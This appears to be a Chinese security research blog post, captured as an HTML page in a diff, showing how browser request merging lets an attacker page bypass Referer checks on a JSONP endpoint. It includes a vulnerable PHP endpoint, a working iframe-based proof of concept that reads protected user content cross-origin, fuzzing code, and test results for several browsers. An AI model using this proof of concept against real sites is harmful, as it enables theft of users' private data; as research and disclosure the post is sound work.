@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  
+  <title>使用request merging bypass referer(jsonp) 检测 - Nearg1e</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script type="text/javascript" src="/js/highlight.pack.js"></script>
+  <script type="text/javascript" src="http://tajs.qq.com/stats?sId=58637942" charset="UTF-8"></script>
+  
+    <link rel="icon" href="/favicon.ico">
+  
+  
+    <link rel="alternative" href="/atom.xml" title="Nearg1e" type="application/atom+xml">
+  
+  <!--[if lt IE 9]>
+    <script type="text/javascript" src="/js/html5.js"></script>
+    <script type="text/javascript" src="/js/css3-mediaqueries.js"></script>
+  <![endif]-->
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/highlight.css">
+
+</head>
+<body>
+    <header id="header">
+    <div class="nav-warp">
+      <nav id="nav" class="w">
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+          <a class="main-nav-link" href="/atom.xml">RSS</a>
+        
+        <a id="nav-search" class="icon-search fr" onclick="show_search()" title="搜索"></a>
+        <div id="nav-search-input" class="hide">
+          <form class="search-form" onsubmit="return dispatch()">
+            <input type="hidden" id="site" value="site:http://blog.neargle.com">
+            <input type="text" id="q" class="input-text" name="q" placeholder="搜索">
+            <input type="submit" value="" class="input-submit">
+          </form>
+        </div>
+      </nav>
+    </div>
+    
+  </header>
+
+  <!-- <div id='wrap'> -->
+    <div id='outer'>
+      <section id="main"><article class="post">
+  <header class="post-head">
+    
+  
+    
+      <h1 class="post-title">使用request merging bypass referer(jsonp) 检测</h1>
+    
+  
+
+    
+<time datetime="2017-08-31T19:01:11.000Z" class="post-time">2017-09-01</time>
+
+  </header>
+  
+  <section class="post-content typo">
+    <p><em>更新两篇之前在其他地方发过的文章</em></p>
+<h2 id="1-_关于request_merging和其会产生的问题">1. 关于request merging和其会产生的问题</h2><p>request merging : 浏览器会把多次相同的请求(并非所有请求)合并成一次，以加快资源加载速度。</p>
+<p>e.g.<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/1"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>只会请求并加载一次”<a href="http://0.0.0.0:8888/jsonp/1&quot;资源。" target="_blank" rel="external">http://0.0.0.0:8888/jsonp/1&quot;资源。</a></p>
+<p><em>曾经有研究指出，这种请求合并想象在iframe里也存在</em>，那么浏览器的这种特性就可以用来bypass部分程序的referer的判断，如jsonp的防御机制。</p>
+<h2 id="2-_环境和POC">2. 环境和POC</h2><p>绕过referer检测，攻击者能否拿到进行referer保护的用户信息？</p>
+<p>攻击者服务器： <a href="http://example.com:8081" target="_blank" rel="external">http://example.com:8081</a><br>目标服务器： <a href="http://example.com:8082" target="_blank" rel="external">http://example.com:8082</a><br>referer检测： referer是否以“<a href="http://example.com:8082”开头" target="_blank" rel="external">http://example.com:8082”开头</a><br>目标： 攻击者拿到属于用户的 “security content”</p>
+<h3 id="环境：">环境：</h3><p>/jsonp.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startsWith</span><span class="params">(<span class="variable">$url</span>, <span class="variable">$domain</span>)</span> </span>&#123;</span><br><span class="line">     <span class="variable">$length</span> = strlen(<span class="variable">$domain</span>);</span><br><span class="line">     <span class="keyword">return</span> (substr(<span class="variable">$url</span>, <span class="number">0</span>, <span class="variable">$length</span>) === <span class="variable">$domain</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$referrer</span> = @<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (startsWith(<span class="variable">$referrer</span>, <span class="string">"http://example.com:8082"</span>)) &#123;</span><br><span class="line">    <span class="variable">$js_code</span> = <span class="string">'function jquery() &#123; return "security content";&#125;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$js_code</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$js_code</span> = <span class="string">'function jquery() &#123; return "nothing";&#125;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$js_code</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>/index.html<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">title</span>&gt;</span>index in http://0.0.0.0<span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8082/jsonp.php"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    <span class="built_in">document</span>.write(location.href + <span class="string">":"</span> +jquery());</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="poc">poc</h3><p><a href="http://example.com:8081/poc.html" target="_blank" rel="external">http://example.com:8081/poc.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;iframe src=&#34;http://example.com:8082/&#34;&#62;&#60;/iframe&#62;&#10;&#60;script type=&#34;text/javascript&#34; src=&#34;http://example.com:8082/jsonp.php&#34;&#62;&#60;/script&#62;&#10;&#60;script type=&#34;text/javascript&#34;&#62;&#10;    document.write(jquery());&#10;&#60;/script&#62;</span><br></pre></td></tr></table></figure></p>
+<p>正常情况这个poc是没有办法获得jsonp里面的信息的，因为不能bypass<code>startsWith($referrer, &quot;http://example.com:8082&quot;)</code>的检测。<br>但是在request merging的情况下，浏览器因为script资源的url是相同的，所以它只会请求<code>http://example.com:8082/jsonp.php</code>一次，则我们可以在<code>example.com:8081</code>里拿到只有<code>example.com:8082</code>可以拿到的资源。</p>
+<h2 id="第一次实验">第一次实验</h2><p>访问：<a href="http://example.com:8081/poc.html" target="_blank" rel="external">http://example.com:8081/poc.html</a></p>
+<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fj4612z2h6j310q0fc3zw.jpg" alt=""></p>
+<p>失败了…<br>之后我开始不正经了…</p>
+<h2 id="fuzz_response_size_in_script_src">fuzz response size in script src</h2><p>难不成是response请求包大小的问题？请求太小的情况下，没有必要合并请求，所以浏览器直接不合并了？fuzz一下看看多大的请求会被合并。</p>
+<p>代码：<br>flask:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Response, Flask, stream_with_context</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/jsonp/&lt;int:size&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jsonp</span><span class="params">(size)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_genrate_file</span><span class="params">(size)</span>:</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="string">"1"</span></span><br><span class="line">        <span class="keyword">yield</span> <span class="string">"\0"</span> * (size-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Response(stream_with_context(_genrate_file(size)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>, threaded=<span class="keyword">True</span>, port=<span class="number">8888</span>, host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>html:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#60;!DOCTYPE html&#62;&#10;&#60;html&#62;&#10;&#60;head&#62;&#10;&#60;meta charset=&#34;utf-8&#34;&#62;&#10;&#60;title&#62;fuzz size of response about request merging&#60;/title&#62;&#10;&#60;/head&#62;&#10;&#60;body&#62;&#10;&#60;script type=&#34;text/javascript&#34;&#62;&#10;(function()&#123;&#10;    for (var size = 3; size &#60;= 100; size++) &#123;&#10;        var iframe = document.createElement(&#39;iframe&#39;);&#10;        var html = &#39;&#39;;&#10;        for (var i = 3; i &#62;= 0; i--) &#123;&#10;            html = html + &#10;            &#39;&#60;script src=http://0.0.0.0:8888/jsonp/&#39;&#10;            + size&#10;            + &#39;&#62;&#60;/&#39;&#10;            + &#39;script&#62;&#39;;&#10;        &#125;&#10;        iframe.src = &#39;data:text/html;charset=utf-8,&#39; + encodeURI(html);&#10;        document.body.appendChild(iframe);&#10;    &#125;&#10;&#125;)();&#10;&#60;/script&#62;&#10;&#60;/body&#62;&#10;&#60;/html&#62;</span><br></pre></td></tr></table></figure></p>
+<p>实验结果，所有请求都合并了。我连1024都没有乘。很小很小的请求都会合并。</p>
+<h2 id="iframe并不会merging??">iframe并不会merging??</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="doctype">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">meta</span> <span class="attribute">charset</span>=<span class="value">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">title</span>&gt;</span>iframe request merging<span class="tag">&lt;/<span class="title">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- test1 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span> <span class="attribute">src</span>=<span class="value">"http://0.0.0.0:8888/jsonp/102400"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> size = <span class="number">1</span>; size &lt;= <span class="number">10</span>; size++) &#123;</span><br><span class="line">        <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">        html = <span class="string">'&lt;script type="text/javascript" src="http://0.0.0.0:8888/jsonp/102400"&gt;&lt;/s'</span> + <span class="string">'cript&gt;'</span></span><br><span class="line">        iframe.src = <span class="string">'data:text/html;charset=utf-8,'</span> + <span class="built_in">encodeURI</span>(html);</span><br><span class="line">        <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- test2 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"https://cdn.bootcss.com/jquery/3.2.1/jquery.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"data:text/html;charset=utf-8,%3Cscript%20src%3D%22https%3A%2F%2Fcdn.bootcss.com%2Fjquery%2F3.2.1%2Fjquery.js%22%3E%3C%2Fscript%3E"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- test3 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"./many_out_script.html"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>测试了三次。果然都没有合并请求…</p>
+<p>绝招！问大佬： <a href="https://twitter.com/nearg1e/status/903297400797663232" target="_blank" rel="external">https://twitter.com/nearg1e/status/903297400797663232</a></p>
+<p>@filedescriptor 是twitter上专注于浏览器安全的安全研究员，之前的“iframe也会发生 request merging”的结论也是他得出来的。</p>
+<p>请教结果： 5月12日的时候验证chrome已经修复了该问题。好吧居然fix了。</p>
+<h2 id="大部分的国产浏览器依然受影响。">大部分的国产浏览器依然受影响。</h2><p>之前windows上对多款浏览器进行过UXSS的测试和特权域API的分析，所以windows环境里还有多款国产浏览器。我们知道大部分国产浏览器是基于chromium的，而且版本更新并不会像chrome那么勤快，特别是内核的更新一直是相对比较缓慢的。很多Nday都可以用(可是src不收呀！)。</p>
+<p>test in 360se 8.2.1.340</p>
+<p><img src="http://ww1.sinaimg.cn/large/005y7Ba5gy1fj46nc4gr1j31d90nowgp.jpg" alt=""></p>
+<p>poc修改为:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8082/"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://example.com:8081/"</span>&gt;</span><span class="tag">&lt;/<span class="title">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这样保证了，攻击者域中的请求后执行。<br>思路验证成功。</p>
+<p>在 IE11和Edge上 好像现在依旧没有fix该问题。我这边的版本可能稍微低了一点，POC都是可用的。</p>
+<ul>
+<li>Microsoft Edge 40.15063.0.0</li>
+<li>IE 11.296.15063.0</li>
+</ul>
+<h2 id="other">other</h2><p>现在很多浏览器漏洞(bug)都是和新特性(feature)相关的，或许request merging还有别的用处？</p>
+<p>想测试自己所用的浏览器是否受印象只需访问：<a href="http://blog.neargle.com/tips-note/request_merging/iframe_merging_poc.html">http://blog.neargle.com/tips-note/request_merging/iframe_merging_poc.html</a>,开发者工具中网络对“<a href="https://cdn.bootcss.com/jquery/3.2.1/jquery.js”的请求只进行了一次，那么就是受影响的。" target="_blank" rel="external">https://cdn.bootcss.com/jquery/3.2.1/jquery.js”的请求只进行了一次，那么就是受影响的。</a></p>
+<h2 id="link">link</h2><p><a href="https://twitter.com/nearg1e/status/903297400797663232" target="_blank" rel="external">https://twitter.com/nearg1e/status/903297400797663232</a><br>Exploiting the unexploitable with lesser known browser tricks from filedescriptor</p>
+
+    <p class="origin-url">本文URL： <a href="http://blog.neargle.com/2017/09/01/use-request-merging-to-bypass-referer-check/index.html">http://blog.neargle.com/2017/09/01/use-request-merging-to-bypass-referer-check/index.html</a></p>
+  </section>
+  
+  <footer class="post-foot">
+    <section class="post-foot-warp clear">
+      
+  <ul class="post-tag icon-tag fl">
+    
+      <li><a href="/tags/前端安全/">#前端安全</a></li>
+    
+  </ul>
+
+      
+    </section>
+  </footer>
+  
+</article>
+
+    
+<nav id="post-nav" class="clear">
+  
+  
+    <a href="/2017/09/01/ddctf-web-xss-sqli-writeup/" id="post-nav-older" class="post-nav-link-wrap fr" title="ddctf 两道web题的Writeup (sqli &amp; xss)">
+      <div class="post-nav-title">ddctf 两道web题的Writeup (sqli &amp; xss) &raquo;</div>
+    </a>
+  
+</nav>
+
+
+
+<section id="comments">
+  <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+</section>
+</section>
+    </div>
+  <!-- </div> -->
+    <footer id="footer">
+    <div class="foot-warp">
+      <p>© 2014 Nearg1e</p>
+    </div>
+  </footer>
+  <script src="/js/tools.js"></script>
+  
+  
+  <script>
+    var disqus_shortname = 'neargle';
+    
+    var disqus_url = 'http://blog.neargle.com/2017/09/01/use-request-merging-to-bypass-referer-check/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  
+  
+</body>
+</html>
